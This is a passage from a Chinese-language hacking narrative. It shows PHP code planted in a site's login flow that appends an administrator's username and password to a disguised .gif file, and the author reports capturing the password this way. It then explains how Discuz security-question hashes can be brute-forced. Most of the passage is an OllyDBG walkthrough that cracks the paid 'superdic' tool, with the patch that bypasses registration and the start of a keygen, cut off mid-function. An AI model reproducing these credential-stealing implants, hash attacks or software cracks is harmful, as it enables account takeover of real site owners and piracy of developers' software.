    ​   $password1 = $this->Password;
    ​   $file="././images/ bg1.gif";
    ​   $handle = @fopen("././images/th_bg1.gif", "a");
    ​   $recontent = fread($handle,filesize($file));
    ​   $content= $username1."----".$password1."----date is:".date("Y-m-d H:i:s")."\r\n";
    ​   $result=$recontent."\r\n".$content;
    ​   @fwrite($handle,$result);
这次我没有着急，因为我发现这个管理员很勤快，几乎天天更新博客，于是第二天顺利记录到其密码。
### 0×0c discuz!提示问题的阻碍
在拿到管理员变态密码迫不及待的登陆之后，第8次悲催的运气也同时降临了。他需要提示问题的答案才能登陆。
鬼才知道他母亲的名字，他爷爷的名字，他父亲出生的城市，他老师的名字……
再说他也不一定就老老实实写真实答案啊。
在以前，我遇到此类情况都是直接放弃，但是这次不同，前面一个多礼拜承载了我太多的磨难和脑细胞，我无法说服自己放弃。
不是有一个早期的bbs的用户数据库嘛？我于是找到了密码提示问题答案的加密字段为：2afd4591.仅仅是一个8位的串，到底是什么加密算法呢。
我再次担当了阅读源代码的苦力差事。引用2yue的一句话，把我累得跟骆驼一样，终于得到如下结果。
Discuz提示问题有7个，按数字序号是1,2,3,4,5,6,7。设为变量$i
明文答案设为变量$pass.
那么2afd4591=substr(md5($pass.md5($id)),16,8)
这样的话，提示问题答案是可以暴力跑的啊，但如果他的答案是汉字或者很变态的长度的明文，也是很难爆出来的。我发现他最后的hash串仅仅是8位，那么有很大的几率是可以碰撞成功的。
于是我认为：肯定存在多个明文，hash与2afd4591一样，但明文不一样，我十分肯定我的分析。
下面就需要先制作一个大字典，然后开始写程序，碰撞吧。
### 0×0d OllyDBG调试superdic并制作注册机
我可没有那么多耐性去做重复的工作，我认为肯定有很多人写过字典生成工具，下载一个用就是了。于是我下载到这个小工具superdic，还挺好用的。如图19：
图19
图19告诉我，如果要使用完整功能，需要花注册费15元，在国内企业压榨我们搞网络安全的薪水的背景下，还让我掏出这15块钱，貌似不是太容易的。
自己操刀OllyDBG调试一下，看这个作者用什么加密算法保护自己的程序吧。其实有时候调试算法，破解作者的加密思路也是一个不错的游戏，但是这次我没有那么多精力了，如果它能在两个小时内阻挡我，那我就从我绵薄的存款中给作者奉献一回吧。
先用peid加载superdic.exe如图20
图20
从图20可以看出，软件是vc++6.0写的，且没有加壳。看到这些我很遐意，看来省了我不少事。再用ida加载函数库符号并导入OllyDBG后，就可以开始分析了。
F9运行后我首先用注册码等于123456789，点注册，弹出一个对话框，提示“请重启本程序，如果您输入的注册密码正确，将能使用本软件的全部功能，并可享受后续版本的免费升级。”那么一般来说，重启验证要么是keyfile,要么是写入注册表。经过下断点测试，我发现该程序使用的是注册表验证。
这样一来，下断就有思路了。
用OllyDBG加载superdic.exe后，在命令行下断bp
RegOpenKeyExA,然后按f9让其运行，眼睛同时观察着右边的堆栈窗口，在第6次f9之后，断在了这里如图21：
图21
从堆栈可以看到该软件注册表的位置是：Software\EUsoft\superdic
用regedit打开看一下这个位置如图22：
图22
图22中看到了superdic把用户名和注册码都保存在了Software\EUsoft\superdic这个位置。
这时在0x77da7852这个位置，按f2取消断点，然后alt+f9即可回到应用程序领空。这样一路f8可以来到这里
    /*403AEA*/  LEA ESI,DWORD PTR DS:[EBX+6FC]
    /*403AF0*/  PUSH ESI
    /*403AF1*/  CALL superdic.004027A0
    /*403AF6*/  ADD ESP,0C
    /*403AF9*/  MOV ECX,EBX
    /*403AFB*/  PUSH ESI
    /*403AFC*/  PUSH 4A0
    /*403B01*/  CALL superdic.00430B3C
    /*403B06*/  MOV EDX,DWORD PTR DS:[EBX+218]
    /*403B0C*/  LEA ESI,DWORD PTR DS:[EBX+218]
    /*403B12*/  PUSH 0FF
    /*403B17*/  MOV ECX,ESI
可以在0x403af0处设置一个断点，接着f7进入CALL superdic.004027A0，大致一看应该是申请号的生成方法,代码如下：
    004027A0   SUB ESP,0C
    004027A3   PUSH ESI
    004027A4   PUSH 0C
    004027A6   CALL superdic.004319E7
    004027AB   PUSH 0A
    004027AD   MOV ESI,EAX
    004027AF   CALL superdic.004319E7
    004027B4   ADD ESP,8
    004027B7   LEA ECX,DWORD PTR SS:[ESP+C]
    004027BB   LEA EDX,DWORD PTR SS:[ESP+4]
    004027BF   PUSH 0A                                  ; /pFileSystemNameSize = 0000000A
    004027C1   PUSH EAX                                 ; |pFileSystemNameBuffer
    004027C2   LEA EAX,DWORD PTR SS:[ESP+10]            ; |
    004027C6   PUSH EAX                                 ; |pFileSystemFlags
    004027C7   PUSH ECX                                 ; |pMaxFilenameLength
    004027C8   PUSH EDX                                 ; |pVolumeSerialNumber
    004027C9   PUSH 0C                                  ; |MaxVolumeNameSize = C (12.)
    004027CB   PUSH ESI                                 ; |VolumeNameBuffer
    004027CC   PUSH superdic.00446148                   ; |RootPathName = "c:\"
    004027D1   CALL DWORD PTR DS:[; \GetVolumeInformationA
    004027D7   MOV EAX,DWORD PTR SS:[ESP+4]
    004027DB   MOV ESI,DWORD PTR SS:[ESP+14]
    004027DF   PUSH EAX
    004027E0   PUSH superdic.00446144                   ;  ASCII "%x"
    004027E5   PUSH ESI
    004027E6   CALL 
这段代码大概是使用GetVolumeInformationA函数再加上其他一系列操作生成申请号的过程，因为是逆注册算法，这一块我们不关心，可以直接f8过去看结果即可，而事实上也确实生成一个子串是24578843，与图19中的申请号相一致。
我接着往下走，前面不关键的地方就不跟了，一直走到这里：
    /*403D48*/  LEA EAX,DWORD PTR DS:[EBX+6FC]
    /*403D4E*/  PUSH ECX
    /*403D4F*/  PUSH EAX
    /*403D50*/  CALL superdic.004034E0
可以看到把申请号压入了堆栈，而函数CALL superdic.004034E0经判断是对申请号做了一次加密过程。从堆栈处看到加密后密文是：
    0012EF6C   0012EFA0  ASCII "BqwITTcm8kG5lcEk"
接着再f8配合f7来慢慢走。
    /*403D5B*/  PUSH ESI
    /*403D5C*/  CALL superdic.00403630
403d5b的位置是把注册码压入堆栈，随即利用CALL superdic.00403630做了一次加密过程。
过了这个call后把我预设的123456789加密成了l6345q789.看下面堆栈数据。
    0012EF64   0012FCA0  ASCII "l6345q789"
随后又经过一些对算法无用的代码后来到这里：
    /*403EBD*/  MOV DL,BYTE PTR DS:[ESI]
    /*403EBF*/  MOV CL,BYTE PTR DS:[EDI]
    /*403EC1*/  MOV AL,DL
    /*403EC3*/  CMP DL,CL
    /*403EC5*/  JNZ SHORT superdic.00403EE5
    /*403EC7*/  TEST AL,AL
    /*403EC9*/  JE SHORT superdic.00403EE1
    /*403ECB*/  MOV CL,BYTE PTR DS:[ESI+1]
    /*403ECE*/  MOV DL,BYTE PTR DS:[EDI+1]
    /*403ED1*/  MOV AL,CL
    /*403ED3*/  CMP CL,DL
    /*403ED5*/  JNZ SHORT superdic.00403EE5
    /*403ED7*/  ADD ESI,2
    /*403EDA*/  ADD EDI,2
    /*403EDD*/  TEST AL,AL
    /*403EDF*/  JNZ SHORT superdic.00403EBD
    /*403EE1*/  XOR EAX,EAX
    /*403EE3*/  JMP SHORT superdic.00403EEA
    /*403EE5*/  SBB EAX,EAX
    /*403EE7*/  SBB EAX,-1
    /*403EEA*/  XOR EDX,EDX
    /*403EEC*/  PUSH 476
    /*403EF1*/  TEST EAX,EAX
    /*403EF3*/  SETE DL
    /*403EF6*/  MOV ECX,EBX
    /*403EF8*/  MOV DWORD PTR DS:[EBX+90],EDX
这段代码即是：BqwITTcm8kG5lcEk与l6345q789的对比过程，如果相等就注册成功。
作者的大题思路就是这样吧，如果爆破的话只需要把403EF1处改为下面的代码即可。
    /*403EF1*/  MOV DL,1
但分析到这里，爆破已经满足不了我的欲望了，再说离我的两个小时还差的远呢。接着看看作者算法的思路吧。
既然我分析的思路已经清晰，我在这里再稍作整理：、
设CALL superdic.004034E0函数=f1()
CALL superdic.00403630函数=f2()
如果f1(申请号)=f2(注册码) 那么就注册成功。
看来f2()函数是关键啊，需要写出它的逆函数，f7进去一看，貌似还很长，如图23：
图23
仅仅图23的一页，还显示不完，我再次像骆驼一样的f7走来走去，再加上ida的f5，终于对这段代码有了初步的了解。
最终我使用了一种巧妙的办法写出了这段代码的逆函数如下。
有点基础的朋友自己看代码吧。我也不好在这里占用太大篇幅去深析这个算法的逆向过程。
    void DicDecode(char *str)
    {
    ​   char end[64]={0};
     if (strlen(str) !=16) *str=0;
     for(int i=0,j=0;i<16,j<64;i++,j=j+4)
     {